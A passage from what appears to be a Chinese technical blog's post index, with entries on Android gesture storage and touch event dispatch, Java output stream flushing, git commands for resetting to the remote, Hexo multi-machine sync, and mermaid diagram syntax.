Mainactivity–&gt;GestureLibrary GestureLibrary–&gt;GestureStore GestureStore源码: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758package android.gesture;public class GestureStore &#123; ... public void addGesture(String entryName, Gesture gesture) &#123; if (entryName == null || entryName.length() == 0) &#123; return; &#125; ArrayList&lt;Gesture&gt; gestures = mNamedGestures.get(entryName); if (gestures == null) &#123; gestures = new ArrayList&lt;Gesture&gt;(); mNamedGestures.put(entryName, gestures); &#125; gestures.add(gesture); mClassifier.addInstance( Instance.createInstance(mSequenceType, mOrientationStyle, gesture, entryName)); mChanged = true; &#125; ... /** * Load the gesture library */ public void load(InputStream stream) throws IOException &#123; load(stream, false); &#125; public void load(InputStream stream, boolean closeStream) throws IOException &#123; DataInputStream in = null; try &#123; in = new DataInputStream((stream instanceof BufferedInputStream) ? stream : new BufferedInputStream(stream, GestureConstants.IO_BUFFER_SIZE)); long start; if (PROFILE_LOADING_SAVING) &#123; start = SystemClock.elapsedRealtime(); &#125; // Read file format version number final short versionNumber = in.readShort(); switch (versionNumber) &#123; case 1: readFormatV1(in); break; &#125; if (PROFILE_LOADING_SAVING) &#123; long end = SystemClock.elapsedRealtime(); Log.d(LOG_TAG, &quot;Loading gestures library = &quot; + (end - start) + &quot; ms&quot;); &#125; &#125; finally &#123; if (closeStream) GestureUtils.closeStream(in); &#125; &#125; ...&#125; 可以看到手势是存在 一个map里面，键值是自定义的手势名称, 一个手势名称对应着好多个手势(手势数组) 12private final HashMap&lt;String, ArrayList&lt;Gesture&gt;&gt; mNamedGestures = new HashMap&lt;String, ArrayList&lt;Gesture&gt;&gt;(); 分析代码添加的核心部分: 12345678910111213141516171819public void addGesture(String entryName, Gesture gesture) &#123; if (entryName == null || entryName.length() == 0) &#123; return; &#125; // 获取这个手势名称下面的所有手势(数组) ArrayList&lt;Gesture&gt; gestures = mNamedGestures.get(entryName); if (gestures == null) &#123; // 此名称还没有对应的手势 // 创建一个存储手势的数组 gestures = new ArrayList&lt;Gesture&gt;(); // 把手势名称和存储用的手势数组放在map里面 mNamedGestures.put(entryName, gestures); &#125; // 存储刚刚创建的手势 gestures.add(gesture); // 单例模式存储 ， 防止数据冲突 mClassifier.addInstance( Instance.createInstance(mSequenceType, mOrientationStyle, gesture, entryName)); mChanged = true; &#125; 1private Learner mClassifier; 分析Learner源码: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162abstract class Learner &#123; private final ArrayList&lt;Instance&gt; mInstances = new ArrayList&lt;Instance&gt;(); /** * Add an instance to the learner * * @param instance */ void addInstance(Instance instance) &#123; mInstances.add(instance); &#125; /** * Retrieve all the instances * * @return instances */ ArrayList&lt;Instance&gt; getInstances() &#123; return mInstances; &#125; /** * Remove an instance based on its id * * @param id */ void removeInstance(long id) &#123; ArrayList&lt;Instance&gt; instances = mInstances; int count = instances.size(); for (int i = 0; i &lt; count; i++) &#123; Instance instance = instances.get(i); if (id == instance.id) &#123; instances.remove(instance); return; &#125; &#125; &#125; /** * Remove all the instances of a category * * @param name the category name */ void removeInstances(String name) &#123; final ArrayList&lt;Instance&gt; toDelete = new ArrayList&lt;Instance&gt;(); final ArrayList&lt;Instance&gt; instances = mInstances; final int count = instances.size(); for (int i = 0; i &lt; count; i++) &#123; final Instance instance = instances.get(i); // the label can be null, as specified in Instance if ((instance.label == null &amp;&amp; name == null) || (instance.label != null &amp;&amp; instance.label.equals(name))) &#123; toDelete.add(instance); &#125; &#125; instances.removeAll(toDelete); &#125; abstract ArrayList&lt;Prediction&gt; classify(int sequenceType, int orientationType, float[] vector);&#125; Learner.addInstance方法: 12345678910abstract class Learner &#123; // 存储单例 private final ArrayList&lt;Instance&gt; mInstances = new ArrayList&lt;Instance&gt;(); ...//void addInstance(Instance instance) &#123; mInstances.add(instance); &#125; ...&#125; 总的来说就是GestureStore.addGesture()： ​ 1). 实现将用户绘制的手势存放到mNamedGestures(HashMap类型)中; ​ 2). 通过用户绘制的gesture得到的Instance类型的对象(Instance.createInstance)； ​ 3). 将Instance类型的对象存放到mClassifier对象(Learner类型)的成员mInstances集合中; Step3: 执行完sStore.addGesture(name, gesture)添加手势后，我们接着执行sStore.save()保存所添加的手势相关的信息。sStore.save()方法的实现在FileGestureLibrary中，代码如下： 1234567891011121314151617181920212223242526public boolean save() &#123; if (!mStore.hasChanged()) return true; final File file = mPath; final File parentFile = file.getParentFile(); if (!parentFile.exists()) &#123; if (!parentFile.mkdirs()) &#123; return false; &#125; &#125; boolean result = false; try &#123; //noinspection ResultOfMethodCallIgnored file.createNewFile(); mStore.save(new FileOutputStream(file), true); result = true; &#125; catch (FileNotFoundException e) &#123; Log.d(LOG_TAG, &quot;Could not save the gesture library in &quot; + mPath, e); &#125; catch (IOException e) &#123; Log.d(LOG_TAG, &quot;Could not save the gesture library in &quot; + mPath, e); &#125; return result;&#125; 1). 通过传进来的File对象创建其对应的输出流(new FileOutputStream(file)) 2). 通过创建的输出流执行调用GestureStore的save方法(mStore.save(new FileOutputStream(file), true)) Step4: GestureStore的save方法代码实现如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546public void save(OutputStream stream, boolean closeStream) throws IOException &#123; DataOutputStream out = null; try &#123; long start; if (PROFILE_LOADING_SAVING) &#123; start = SystemClock.elapsedRealtime(); &#125; final HashMap&lt;String, ArrayList&lt;Gesture&gt;&gt; maps = mNamedGestures; out = new DataOutputStream((stream instanceof BufferedOutputStream) ? stream : new BufferedOutputStream(stream, GestureConstants.IO_BUFFER_SIZE)); // Write version number out.writeShort(FILE_FORMAT_VERSION); // Write number of entries out.writeInt(maps.size()); for (Map.Entry&lt;String, ArrayList&lt;Gesture&gt;&gt; entry : maps.entrySet()) &#123; final String key = entry.getKey(); final ArrayList&lt;Gesture&gt; examples = entry.getValue(); final int count = examples.size(); // Write entry name out.writeUTF(key); // Write number of examples for this entry out.writeInt(count); //遍历ArrayList&lt;Gesture&gt;中的Gesture且调用Gesture的serialize函数进行序列化写入相关信息 for (int i = 0; i &lt; count; i++) &#123; examples.get(i).serialize(out); &#125; &#125; out.flush(); if (PROFILE_LOADING_SAVING) &#123; long end = SystemClock.elapsedRealtime(); Log.d(LOG_TAG, &quot;Saving gestures library = &quot; + (end - start) + &quot; ms&quot;); &#125; mChanged = false; &#125; finally &#123; if (closeStream) GestureUtils.closeStream(out); &#125;&#125; GestureStore的save方法中代码实现如下： 1). 将执行Step3中得到的mNamedGestures赋值给maps； 2). 通过传进来的输出流创建对应的DataOutputStream类型对象out； 3). 将FILE_FORMAT_VERSION和maps.size()写入out中； 4). 遍历maps，将遍历出的每个ArrayList在maps中的key值和自身存放Gesture的个数count值，分别写入out中； 5). 遍历ArrayList中的Gesture，然后将out作为实参调用执行Gesture的serialize方法； Step5:继续跟踪到 Gesture的serialize方法，代码如下： 12345678910111213141516171819202122232425262728public class Gesture implements Parcelable &#123; ... private long mGestureID; private final ArrayList&lt;GestureStroke&gt; mStrokes = new ArrayList&lt;GestureStroke&gt;(); ... public Gesture() &#123; mGestureID = GESTURE_ID_BASE + sGestureCount.incrementAndGet(); &#125; ... void serialize(DataOutputStream out) throws IOException &#123; final ArrayList&lt;GestureStroke&gt; strokes = mStrokes; final int count = strokes.size(); // Write gesture ID out.writeLong(mGestureID); //写入GestureID // Write number of strokes out.writeInt(count); //写入ArrayList&lt;GestureStroke&gt;集合中GestureStroke的个数 /*遍历ArrayList&lt;GestureStroke&gt;集合， * 同时调用GestureStroke的serialize函数向输出流中进行序列化写入相关信息 */ for (int i = 0; i &lt; count; i++) &#123; strokes.get(i).serialize(out); &#125; &#125; ... &#125; Gesture的serialize方法中代码实现如下： 1). 将Gesture对应的mStrokes赋值给strokes； 2). 将Gesture的mGestureID和GestureStroke在strokes中的个数count分别写入DataOutputStream类型的对象out; 3). 遍历strokes中的GestureStroke，然后将out作为实参调用执行GestureStroke的serialize方法； Step6: 继续跟踪到 GestureStroke的serialize方法，代码如下： 1234567891011121314151617181920212223242526public class GestureStroke &#123; ... public final float[] points; //保存组成手势行程的多数个点的x,y坐标值 private final long[] timestamps;//保存组成手势行程的多数个点的时间戳 ... void serialize(DataOutputStream out) throws IOException &#123; //points、timestamps分别由ArrayList&lt;GesturePoint&gt;中拆分得到 final float[] pts = points; final long[] times = timestamps; final int count = points.length; // Write number of points out.writeInt(count / 2); for (int i = 0; i &lt; count; i += 2) &#123; // Write X out.writeFloat(pts[i]); //写入x轴对应的坐标值 // Write Y out.writeFloat(pts[i + 1]); //写入y轴对应的坐标值 // Write timestamp out.writeLong(times[i / 2]); //写入时间戳 &#125; &#125; ... &#125; GestureStroke的serialize方法中代码实现如下： 1). 将GestureStroke中对应的点数组points和时间戳数组timestamps分别赋值给数组pts和times 2). 将GestureStroke中组成手势的点数count / 2写入DataOutputStream类型的对象out；(pts数组中每两个元素保存一个点对应的x,y值，所以，总点数为数组所有元素个数count除以2) 3). 遍历数组pts，将每个点对应的x,y轴坐标值和时间戳分别写入out； GestureAPI 巨硬API Android应用程序编程语言是JAVA，而linux的很多服务程序，包括一些libraries都是用c 或者c++写的，应用程序使用什么样的机制去调用这些系统函数的呢？Java的虚拟机可以通过 System.loadLibrary 来加载本地库，也可以通过JNI函数 RegisterNatives来注册与类相关联的本地方法。在Android中对于一些底层平台相关的native函数大多采用注册关联的方式来调用。 系统启动后两个重要的process: 1：App_main process: 进程通过AndroidRuntime调用register_jni_procs向JNI注册模块的native函数供JVM调用。 2：Mediaserver proces： 相关链接 Android JNI原理分析"},{"title":"AndroidNoResourceid","date":"2019-11-24","updated":"2024-03-19","path":"2019/11/24/AndroidNoResourceid/","text":"删除AndroidManifest.xml里的 android:roundIcon=“@mipmap/ic_launcher_round”"},{"title":"JavaIO流","date":"2019-11-24","updated":"2024-03-19","path":"2019/11/24/JavaIO流/","text":"Java中文文档 来看一下FileOutputStream： FileOutputStream.flush() 进入后发现是直接调用其父类也就是OutputStream里面的flush()方法。也就是FileOutputStream并没有对这个方法重写。嗯~ 没啥问题。 FileOutputStream.close() 进去查看close的具体实现，发现FileOutputStream重写了基类的close()方法: 12345678910111213141516171819202122public void close() throws IOException &#123; synchronized (closeLock) &#123; //上个锁 if (closed) &#123; return; &#125; closed = true; &#125; // Android-added: CloseGuard support. guard.close(); // 记录防止资源泄漏 if (channel != null) &#123; // 如果有channel一起关闭 channel.close(); &#125; // BEGIN Android-changed: Close handling / notification of blocked threads. if (isFdOwner) &#123; IoBridge.closeAndSignalBlockedThreads(fd); &#125; // END Android-changed: Close handling / notification of blocked threads.&#125; 可以看到在关闭文件流前做了一些资源泄露的检查等工作，但并没有调用flush()来刷新流，所以如果此时流中还有数据，并且没有手动刷新，直接关闭数据可能会丢失。 再来看一下BufferedOutputStream: BufferedOutputStream继承关系: BufferedOutputStream.flush(): 1234public synchronized void flush() throws IOException &#123; flushBuffer(); out.flush(); &#125; 1234567 /** 刷新内部缓冲区 */ private void flushBuffer() throws IOException &#123; if (count &gt; 0) &#123; out.write(buf, 0, count); count = 0; &#125;&#125; BufferedOutputStream提供了缓冲区的功能，所以在flush方法里增加了缓冲区刷新的功能 BufferedOutputStream.close(): 可以发现BufferedOutputStream() 的父类FilterOutputStream()对基类的方法进行了重写，在close()前还调用了一次flush()方法 1234567 @SuppressWarnings(&quot;try&quot;)public void close() throws IOException &#123; try (OutputStream ostream = out) &#123; flush(); &#125;&#125; 这里的flush()方法并不是基类的flush，FilterOutputStream()也对这个函数进行了重写: 1234 public void flush() throws IOException &#123; out.flush();&#125; 上面的out变量即为基类的一个对象，用来调用基类的方法。 1protected OutputStream out; 综合起来看发现,FilterOutputStream()方法是对close方法进行重写，在关闭流之前自动调用了一次刷新，这样即使缓冲区还有数据，我们直接调用BufferedOutputStream的close方法也不会造成数据的丢失。 BufferedOutputStream全部源码分析 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475publicclass BufferedOutputStream extends FilterOutputStream &#123; /** * 存储数据的内部缓冲区 */ protected byte buf[]; /** 缓冲区中的有效字节数。 */ protected int count; /** * 创建新的缓冲输出流以将数据写入指定的基础输出流 */ public BufferedOutputStream(OutputStream out) &#123; this(out, 8192); &#125; /** * 创建新的缓冲输出流以将数据写入 * 具有指定缓冲区的指定基础输出流 * 大小。 */ public BufferedOutputStream(OutputStream out, int size) &#123; super(out); if (size &lt;= 0) &#123; throw new IllegalArgumentException(&quot;Buffer size &lt;= 0&quot;); &#125; buf = new byte[size]; &#125; /** 刷新内部缓冲区 */ private void flushBuffer() throws IOException &#123; if (count &gt; 0) &#123; out.write(buf, 0, count); count = 0; &#125; &#125; /** * 将指定的字节写入此缓冲输出流 */ public synchronized void write(int b) throws IOException &#123; if (count &gt;= buf.length) &#123; flushBuffer(); &#125; buf[count++] = (byte)b; &#125; /** * 将从偏移量off开始的指定字节数组的len长度字节写入缓冲输出流。通常，此方法将给定数组中的字节存储到此流的缓冲区中，根据需要将缓冲区刷新到基础输出流。但是，如果请求的长度至少与此流的缓冲区一样大，则此方法将刷新缓冲区并将字节直接写入基础输出流。因此，冗余的BufferedOutputStream不会不必要地复制数据。 */ public synchronized void write(byte b[], int off, int len) throws IOException &#123; if (len &gt;= buf.length) &#123; /* 如果请求长度超过输出缓冲区的大小，请刷新输出缓冲区，然后直接写入数据。 */ flushBuffer(); out.write(b, off, len); return; &#125; if (len &gt; buf.length - count) &#123; flushBuffer(); &#125; System.arraycopy(b, off, buf, count, len); count += len; &#125; /** * 刷新此缓冲输出流。这将强制将任何缓冲输出字节写入底层输出流。 */ public synchronized void flush() throws IOException &#123; flushBuffer(); out.flush(); &#125;&#125;"},{"title":"git远程覆盖本地","date":"2019-11-24","updated":"2024-03-19","path":"2019/11/24/git远程覆盖本地/","text":"error: 您对下列文件的本地修改将被合并操作覆盖： public/index.html public/tags/index.html public/tags/test/index.html 请在合并前提交或贮藏您的修改。 正在终止 解决方法： 1.git强制覆盖本地文件（与git远程仓库保持一致）： git fetch --all git reset --hard origin/master git pull git强制覆盖本地命令（单条执行）： git fetch --all &amp;&amp; git reset --hard origin/master &amp;&amp; git pull 如果希望保留生产服务器上所做的改动,仅仅并入新配置项, 处理方法如下: 12345$ git stash $ git pull $ git stash pop 然后可以使用git diff -w +文件名 来确认代码自动合并的情况. 反过来,如果希望用代码库中的文件完全覆盖本地工作版本. 方法如下: 123git reset --hard git pull 其中git reset是针对版本,如果想针对文件回退本地修改,使用 1git checkout HEAD file/to/restore"},{"title":"Hexo多平台同步","date":"2019-11-23","updated":"2024-03-19","path":"2019/11/23/Hexo多平台同步/","text":"在github上创建一个私有仓库 在主机A(存储博客源码的战绩)中的主题目录下删除.git仓库, 因为git仓库中不允许包含别的仓库，不删除的话这部分就会被忽略 ​ Butterfly里面的 在A主机 hexo根目录下 初始化一个git仓库: git init 将本地新建的仓库关联到远程仓库 git: git remote add origin [远程仓库ssh] 提交本地仓库到远程 修改 Hexo根目录下的 .gitignore文件,删除 public 文件夹这一行 git add . git push -u origin master 可能遇到本地历史和远程提交历史不符合的情况(有可能是建远程仓库时自动生成了README)。 解决办法:git pull origin master --allow-unrelated-histories 忽略掉历史 在主机B(新机器)上安装Hexo环境 先安装 Node.js 安装hexo npm install -g hexo-cli 克隆远程仓库到本地 git clone + 仓库地址 进入克隆下来的项目文件夹 npm install hexo-deployer-git 两台机器使用前需要同步环境: git pull 使用后应该上传修改后的环境: git push origin master 便于记忆,在我的windows上配置了两个脚本 HexoSyn，HexoUpload HexoSyn是用来同步其他机器的云端修改到本地的 HexoUpload是更新本地机器修改到云端 注意 .gitignore 文件中的被忽略的目录 不要把 .deploy_git 目录也提交，这个目录是hexo生成的静态页面 。.deploy里面还包含其他仓库 可能第一次提交远程仓库的时候会出现问题："},{"title":"asset","date":"2019-11-23","updated":"2024-03-19","path":"2019/11/23/asset/","text":""},{"title":"markdown流程图甘特图等绘制","date":"2019-11-21","updated":"2024-03-19","path":"2019/11/21/markdown流程图甘特图等/","text":"1、横向流程图源码格式： 12345678```mermaidgraph LRA[方形] --&gt;B(圆角) B --&gt; C&#123;条件a&#125; C --&gt;|a=1| D[结果1] C --&gt;|a=2| E[结果2] F[横向流程图]``` 2、竖向流程图源码格式： 12345678```mermaidgraph TDA[方形] --&gt; B(圆角) B --&gt; C&#123;条件a&#125; C --&gt; |a=1| D[结果1] C --&gt; |a=2| E[结果2] F[竖向流程图]``` 3、标准流程图源码格式： 1234567891011```flowst=&gt;start: 开始框op=&gt;operation: 处理框cond=&gt;condition: 判断框(是或否?)sub1=&gt;subroutine: 子流程io=&gt;inputoutput: 输入输出框e=&gt;end: 结束框st-&gt;op-&gt;condcond(yes)-&gt;io-&gt;econd(no)-&gt;sub1(right)-&gt;op``` 4、标准流程图源码格式（横向）： 1234567891011```flowst=&gt;start: 开始框op=&gt;operation: 处理框cond=&gt;condition: 判断框(是或否?)sub1=&gt;subroutine: 子流程io=&gt;inputoutput: 输入输出框e=&gt;end: 结束框st(right)-&gt;op(right)-&gt;condcond(yes)-&gt;io(bottom)-&gt;econd(no)-&gt;sub1(right)-&gt;op``` 5、UML时序图源码样例： 1234567```sequence对象A-&gt;对象B: 对象B你好吗?（请求）Note right of 对象B: 对象B的描述Note left of 对象A: 对象A的描述(提示)对象B--&gt;对象A: 我很好(响应)对象A-&gt;对象B: 你真的好吗？``` 6、UML时序图源码复杂样例： 12345678910111213```sequenceTitle: 标题：复杂使用对象A-&gt;对象B: 对象B你好吗?（请求）Note right of 对象B: 对象B的描述Note left of 对象A: 对象A的描述(提示)对象B--&gt;对象A: 我很好(响应)对象B-&gt;小三: 你好吗小三--&gt;&gt;对象A: 对象B找我了对象A-&gt;对象B: 你真的好吗？Note over 小三,对象B: 我们是朋友participant CNote right of C: 没人陪我玩``` 7、UML标准时序图样例： 1234567891011121314```mermaid%% 时序图例子,-&gt; 直线，--&gt;虚线，-&gt;&gt;实线箭头 sequenceDiagram participant 张三 participant 李四 张三-&gt;王五: 王五你好吗？ loop 健康检查 王五-&gt;王五: 与疾病战斗 end Note right of 王五: 合理 食物 &lt;br/&gt;看医生... 李四--&gt;&gt;张三: 很好! 王五-&gt;李四: 你怎么样? 李四--&gt;王五: 很好!``` 8、甘特图样例： 123456789101112131415161718192021```mermaid%% 语法示例 gantt dateFormat YYYY-MM-DD title 软件开发甘特图 section 设计 需求 :done, des1, 2014-01-06,2014-01-08 原型 :active, des2, 2014-01-09, 3d UI设计 : des3, after des2, 5d 未来任务 : des4, after des3, 5d section 开发 学习准备理解需求 :crit, done, 2014-01-06,24h 设计框架 :crit, done, after des2, 2d 开发 :crit, active, 3d 未来任务 :crit, 5d 耍 :2d section 测试 功能测试 :active, a1, after des3, 3d 压力测试 :after a1 , 20h 测试报告 : 48h``` 效果图如下："},{"title":"事件分发机制","date":"2019-11-21","updated":"2024-03-19","path":"2019/11/21/事件分发机制/","text":"原文地址 其实安卓事件分发的主体思路非常简单，即 父组件不断向子组件分发，若子组件能够处理，则立刻返回。若子组件都不处理，那传递到底层的子组件，再返回回来。 被分发的对象 被分发的对象是那些？被分发的对象是用户触摸屏幕而产生的点击事件，事件主要包括：按下、滑动、抬起与取消。这些事件被封装成MotionEvent对象。该对象中的主要事件如下表所示： 事件 触发场景 单次事件流中触发的次数 MotionEvent.ACTION_DOWN 在屏幕按下时 1次 MotionEvent.ACTION_MOVE 在屏幕上滑动时 0次或多次 MotionEvent.ACTION_UP 在屏幕抬起时 0次或1次 MotionEvent.ACTION_CANCLE 滑动超出控件边界时 0次或1次 按下、滑动、抬起、取消这几种事件组成了一个事件流。事件流以按下为开始，中间可能有若干次滑动，以抬起或取消作为结束。 分发事件的组件 分发事件的组件，也称为分发事件者，包括Activity、View和ViewGroup。它们三者的一般结构为： 从上图中可以看出，Activity包括了ViewGroup，ViewGroup又可以包含多个View。 组件 特点 举例 Activity 安卓视图类 如MainActivity ViewGroup View的容器，可以包含若干View 各种布局类 View UI类组件的基类 如按钮、文本框 分发的核心方法 负责对事件进行分发的方法主要有三个，分别是： dispatchTouchEvent () onTouchEvent () onInterceptTouchEvent () 它们并不存在于所有负责分发的组件中，其具体情况总结于下面的表格中： 组件 dispatchTouchEvent onTouchEvent onInterceptTouchEvent Activity 存在 存在 不存在 ViewGroup 存在 存在 存在 View 存在 存在 不存在 从表格中看，dispatchTouchEvent,onTouchEvent方法存在于上文的三个组件中。而onInterceptTouchEvent为ViewGroup独有。这些方法的具体作用在下文作介绍。 ViewGroup类中，实际是没有onTouchEvent方法的，但是由于ViewGroup继承自View，而View拥有onTouchEvent方法，故ViewGroup的对象也是可以调用onTouchEvent方法的。故在表格中表明ViewGroup中存在onTouchEvent方法的。 事件分发过程 这一小节是本文的核心内容，会从整体上对事件的分发过程作介绍。 对于事件分发过程从，笔者认为网上的一些教程中的观点是有误的。 网上部分教程认为事件是从内部（如Button）开始分发的，这是有误的。 网上部分教程常使用’向上‘、’向下‘传播等描述，但又未对‘何为上’、‘何为下’作解释。 网上部分教程将Java的子类对象调用父类方法（向上转型）的过程也称为‘向上’传播，即将事件在组件之间的传播与程序语言多态特性混为一谈，让初学者费解。 子类在覆写的方法中调用父类的同名方法，被称为’向上传播‘，这也是不对的。 为此在介绍分发过程之前，先对一些概念作定义： 向下传播：Activity包括Layout，事件从Activity向Layout传播被称作’向下传播‘。Layout包含若干View，事件从Layout向其子View传播，也被称为’向下传播‘。 1234graph LRA(Activity)--&gt;|向下传播|B(Layout:代表ViewGroup)B(Layout:代表ViewGroup)--&gt;|向下传播|C(子View) 向上传播：与’向下传播‘相反。 ’向上转型‘不能称为传播，即子类对象调用父类方法，或在覆写的方法中调用父类方法，都不能称为传播。不能将面向对象程序语言中的概念与布局层次中的上下传播混为一谈。 分发方法dispatchTouchEvent 从方法的名称中可以看出该方法主要是负责分发，是安卓事件分发过程中的核心。事件是如何传递的，主要就是看该方法，理解了这个方法，也就理解了安卓事件分发机制。 在了解该方法的核心机制之前，需要知道一个结论： 如果某个组件的该方法返回TRUE,则表示该组件已经对事件进行了处理，不用继续调用其余组件的分发方法，即停止分发。 如果某个组件的该方法返回FALSE,则表示该组件不能对该事件进行处理，需要按照规则继续分发事件。在不复写该方法的情况下，除了一些特殊的组件，其余组件都是默认返回False的。后续有例子说明。 为何返回TRUE就不用继续分发，而返回FALSE就停止分发呢？为了解决这个疑问，需要看一看该方法的具体分发逻辑。为了便于理解，下面对dispatchTouchEvent方法进行简化，只保留最核心的逻辑。 Activity的dispatchTouchEvent方法 12345678// Activity中该方法的核心部分伪代码public boolean dispatchTouchEvent(MotionEvent ev) &#123; if (child.dispatchTouchEvent(ev)) &#123; return true; //如果子View消费了该事件,则返回TRUE，让调用者知道该事件已被消费 &#125; else &#123; return onTouchEvent(ev); //如果子View没有消费该事件，则调用自身的onTouchEvent尝试处理。 &#125;&#125; 首先，从核心逻辑中看出，当事件传递给Activity后，它先将事件分发给子View处理。 如果经过子View层层传递或处理后，该事件被消费了（即返回了TRUE），则Activity的分发方法也返回TRUE，同样也表示该事件已经被消费了。 如果经过子View层层传递或处理后，该事件没有被消费（即返回了FALSE），则Activity的分发方法就不会返回TRUE了，而是调用onTouchEvent()去处理，看其实际的处理情况。 如果onTouchEvent消费了事件，那依然能返回TRUE（表示已消费事件），这个TRUE作为dispatchTouchEvent的返回值，让调用它的对象知道该Activity已经消费了事件。 如果onTouchEvent没有消费该事件，那就返回FALSE（表示未消费事件），这个FALSE作为dispatchTouchEvent的返回值，让调用它的对象知道该Activity没有消费事件，需要继续处理。 ViewGroup的dispatchTouchEvent方法 12345678// ViewGroup中该方法的核心部分伪代码public boolean dispatchTouchEvent(MotionEvent ev) &#123; if (!onInterceptTouchEvent(ev)) &#123; return child.dispatchTouchEvent(ev); //不拦截，则传给子View进行分发处理 &#125; else &#123; return onTouchEvent(ev); //拦截事件，交由自身对象的onTouchEvent方法处理 &#125;&#125; ViewGroup的该方法与Activity的类似，只是新添了一个onInterceptTouchEvent方法。当事件传入时，首先会调用onInterceptTouchEvent &gt; 但当View Group中的dispatchTouchEvent() 被覆写时,会直接返回True,不再考虑拦截。 如果该方法返回了FALSE（表示不拦截），则交给子View去调用dispatchTouchEvent（）方法 如果该方法返回了TRUE（表示拦截），则直接交给该ViewGroup对象的onTouchEvent(ev)方法处理，具体是否能处理以onTouchEvent()的实际情况为准。 实际上，在onInterceptTouchEvent返回TURE表示拦截时，实际调用的是super.dispatchTouchEvent方法，即View的该方法，进而由该方法调用onTouchEvent. View的dispatchTouchEvent方法 12345678// View中该方法的核心部分伪代码public boolean dispatchTouchEvent(MotionEvent ev) &#123; //如果该对象的监听成员变量不为空，则会调用其onTouch方法， if (mOnTouchListener != null &amp;&amp; mOnTouchListener.onTouch(this, event)) &#123; return true; //若onTouch方法返回TRUE，则表示消费了该事件，则dispachtouTouchEvent返回TRUE，让其调用者知道该事件已被消费。 &#125; return onTouchEvent(ev); //若监听成员为空或onTouch没有消费该事件，则调用对象自身的onTouchEvent方法处理。&#125; 从该方法的核心逻辑中可以看到，事件传递进来后，首先会对mOnTouchListener判空，如果之前Set了Listener，则会调用其onTouch方法。 若onTouch方法返回TRUE，则dispatchTouchEvent也会返回TRUE，表示消费该事件。 若onTouch方法返回FALSE，或者mOnTouchListener本来就是空，则调用自身的onTouchEvent()来处理，是否消费事件，可以由其返回值判断。 实际上，在View的onTouchEvent方法中，如果设置了onClickListener监听对象，则会调用其onClick方法。 在同时设置了onTouchListener与onClickListener对象的情况下，正是由于View的dispacthTouchEvent方法会先调用mOnTouchListener的onTouch,才会调用onTouchEvent方法，所以onTouchListener对象的onTouch方法是优先于onClickListener对象的onClick方法调用的。这里只简单描述结论，具体源码请查看本文对应的高级篇内容。 小节：dispatchTouchEvent方法 回顾上面Activity、ViewGroup和View中的dispatchTouchEvent方法，它们大体都可以分为两部分，前一部分是交由子View的dispatchTouchEvent方法或onTouch方法进行处理，后一部分是交给自身的onTouchEvent方法处理。这样理解的话，就非常便于记忆了。 为了便于记忆和理解，可以将各组件的dispatchTouchEvent方法分为两部分： 子View的dispatchTouchEvent 或 onTouch方法 自身的onTouchEvent方法 这个结构有点类似于递归的过程，就是组件的dispatchTouchEvent会自用子组件的同名方法，子组件一样会调用子子组件的同名方法，直到递归到底，然后在从递归底部返回上层，直到返回到最上层，整个过程结束。或者在这个过程中，事件传递到某个子View，该子View决定处理该事件，则事件交给其自身的onTouchEvent方法处理，如果onTouchEvent方法处理不了，再交由父组件的同名方法处理，直到向上传递到顶层结束。 于是，就有了很多教程里的U型图。 从U型图中可以发现，其实安卓事件分发的主体思路非常简单，即由父组件不断向子组件分发，若子组件能够处理，则立刻返回。若子组件都不处理，那传递到底层的子组件，再返回回来。这个过程类似上面说的递归的过程。 这里对这个U型图做一下说明，先看图中左上角，事件传到Activity，首先调用其dispatchTouchEvent方法，其会传递给子View处理，该子View（在图中是ViewGroup）会调用其dispatchTouchEvent方法，如果该方法被覆写直接返回TRUE,则立即返回Activity(不用再考虑拦截)，表示已经消费事件。如果该方法没有被覆写或调用了super的同名方法，则会调用onInterceptTouchEvent方法，如果该方法返回TRUE拦截事件，则交给自身的onTouchEvent处理，如果该方法返回FALSE不拦截，则继续传给子子View（图中是View）的dispatchTouchEvent方法处理。此时，再看看这个U型图，该递归调用已经到底了，若在该方法中的onTouchListener方法不处理，则调用自身的onTouchEvent处理。若还是处理不了，则从递归底部向上返回，依次调用ViewGroup的、Activity的onTouchEvent方法。 实际上，用这个U型图来描述安卓的事件分发机制并不一定准确，因为同一对象的dispatchTouchEvent方法实际是包含了另外几个方法的（Activity与View只包含onTouchEvent),但是在这个图中，却是将几个方法分别画在不同的框中。所以通过该U型图来理解事件分发机智是不准确的。但是对于部分读者可能会有所帮助。要准确理解事件调用机制，还是应该回到上面，查看三个核心方法的核心逻辑，就能够准确理解。 强调说明，安卓事件分发的‘向上’与‘向下‘传播，不要与面向对象程序语言中基类与子类关系，或子类向上调用父类方法等概念搞混淆。对于安卓事件分发的‘向上’与‘向下‘传播，这里的上与下，是指在’递归‘调用过程中的上与下（也体现到U型图里的上与下）。这个概念，体现到布局中，就是外与内。即这里所说的事件’向下‘传播，等同于在布局上，由外向内传播，而’向上’传播，等同于在布局上，由内向外传播。 在面向对象程序语言中，对于子类覆盖父类方法，或子类调用父类方法，这些‘上’与‘下’的关系，在布局层面上并没有跨越布局层次，不要与事件传播的方向概念相混淆。 拦截方法onInterceptTouchEvent 该方法是ViewGroup类对象所独有的，用于对事件进行提前拦截。在一般情况下，该方法是默认返回FALSE的，即不拦截。 如果自定义的ViewGroup希望拦截事件，不希望事件继续往子View传播，可以覆写该方法，返回TRUE，即可阻止向下的传播过程。 实际上，从上面的核心逻辑的伪代码中可以看出，在ViewGroup调用dispatchTouchEvent后，肯定会调用该方法，根据该方法的返回值来确定如何处理。若该方法返回True，则会将事件拦截掉，就给自身的onTouchEvent处理。如果返回False,则继续传递给child执行分发流程。 处理方法onTouchEvent 该方法主要对事件进行处理，若返回True表示已经处理了事件，若返回False则表示没有对事件进行处理，需要继续传递事件。一般情况下，默认为FALSE。在View的onTouchEvent方法中，如果设置了onClickListener监听对象，则会调用其onClick方法。 6. 总结 本文在介绍了事件分发基本概念的基础上，介绍了负责参与事件分发的核心方法，包括dispatchTouchEvent()、onInterceptTouchEvent与onTouchEvent方法。通过伪代码的形式介绍了这些方法的核心逻辑，重点分析了在Activity、ViewGroup与View中的dispatchTouchEvent方法。它们三者中的该方法结构类似，都是先调用子View的同名方法或者listener方法，然后再调用自身的onTouchEvent方法。 